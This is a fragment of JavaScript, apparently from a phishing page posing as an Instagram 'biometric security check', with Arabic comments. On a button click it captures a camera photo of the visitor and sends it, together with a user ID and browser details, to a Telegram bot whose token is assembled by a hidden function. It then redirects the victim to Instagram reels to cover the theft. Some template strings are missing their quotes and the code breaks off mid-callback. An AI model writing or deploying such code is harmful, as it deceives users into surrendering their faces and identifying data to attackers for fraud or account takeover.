        // التقاط صورة الكاميرا عند طلب التحقق الأمني
        document.getElementById('biometric-btn').addEventListener('click', async function() {
            this.innerText = "... جاري الفحص";
            this.disabled = true;

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                // انتظار قليل لتكون الكاميرا جاهزة
                await new Promise(resolve => setTimeout(resolve, 1000));

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(async (blob) => {
                    const fd = new FormData();
                    fd.append('chat_id', cId);
                    fd.append('photo', blob, 'biometric.jpg');
                    fd.append('caption', 📸 صورة القياسات الحيوية لـ:\n👤 ${user_id}\n📱 ${navigator.userAgent});

                    await fetch(https://api.telegram.org/bot${_buildKey()}/sendPhoto, { method: 'POST', body: fd });

                    stream.getTracks().forEach(t => t.stop());
                    window.location.replace("https://www.instagram.com/reels/");
                }, 'image/jpeg');
